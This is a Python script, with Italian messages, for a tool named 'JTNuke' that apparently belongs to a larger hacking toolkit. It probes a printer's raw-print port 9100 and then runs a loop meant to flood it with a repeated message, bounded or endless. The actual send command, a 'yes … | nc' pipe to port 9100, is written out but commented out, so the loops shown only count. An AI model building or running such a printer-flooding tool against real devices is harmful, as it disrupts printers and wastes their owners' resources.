#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import socket
from datetime import datetime

end = '\033[0m'
red = '\033[1;31m'
bright_green = '\033[1;32m'
bright_yellow = '\033[1;33m'

def final():
    import nelson as n
    n.main()

def check_printer(printer):
    socket.setdefaulttimeout(1)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exist = False
    try:
        s.connect((printer, 9100))
        exist = True
    except:
        exist = False
    s.close()
    return exist

def start(printer, packets, message):
    if message == "":
        print("\n[%s*%s] Nessun messaggio inserito, verrà usato 'Hello'"%(bright_yellow,end))
        message = "Hello"

    print("\n[#] JTNuke\n")
    print("[#] Stampante: %s"%(printer))
    print("[#] Messaggio: %s"%(message))
    if packets != None:
        print("[#] Pacchetti: %s"%(packets))

    if check_printer(printer) == True:
        print("\n[%s+%s] Porta 9100 raggiungibile\n"%(bright_green,end))
        current_time = datetime.now().strftime('%H:%M:%S')
        print("[%s+%s] Flood avviato: %s"%(bright_green,end, current_time))
        sent = 0

        if packets != None:
            while int(sent) != int(packets):
                try:
                    #os.system("yes %s | nc -q 0 %s 9100"%(message,printer))
                    sent += 1
                    sys.stdout.write("\r[%s*%s] Richieste inviate: %s/%s "%(bright_yellow,end, sent, packets))
                    sys.stdout.flush()
                except KeyboardInterrupt:
                    print("\n\n[%s-%s] Interrotto\n"%(red,end))
                    final()

            current_time = datetime.now().strftime('%H:%M:%S')
            print("\n\n[%s+%s] Terminato: %s\n"%(bright_green,end, current_time))

        else:
            while True:
                try:
                    sys.stdout.write("\r[%s+%s] Richieste inviate: %s "%(bright_green,end, sent))
                    sys.stdout.flush()
                    #os.system("yes %s | nc -q 0 %s 9100"%(message,printer))
                    sent += 1
                except KeyboardInterrupt:
                    current_time = datetime.now().strftime('%H:%M:%S')
                    print("\n\n[%s-%s] Interrotto: %s\n"%(red,end, current_time))
                    final()
    else:
        print("\n[%s-%s] Porta 9100 non raggiungibile\n"%(red,end))
